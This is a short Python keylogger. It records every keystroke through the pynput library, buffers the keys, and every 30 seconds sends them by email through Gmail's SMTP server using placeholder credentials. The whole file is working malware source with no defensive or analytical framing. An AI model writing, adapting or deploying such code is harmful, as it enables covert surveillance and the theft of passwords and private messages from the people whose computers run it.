import threading
import pynput.keyboard
import smtplib

log = ""


def callback_function(key):
    global log

    try:
        log = log + str(key.char)
    except AttributeError:
        # Special keys do not have a `.char` attribute, so handle them separately.
        if key == pynput.keyboard.Key.space:
            log = log + ""
        else:
            log = log + str(key)
    print(log)


def send_email(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


listener = pynput.keyboard.Listener(on_press=callback_function)


def thread_function():
    global log
    # Periodically send the buffered keystrokes, then reset the buffer.
    send_email("test@gmail.com", "test", log)
    log = ""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()


with listener:
    thread_function()
    listener.join()
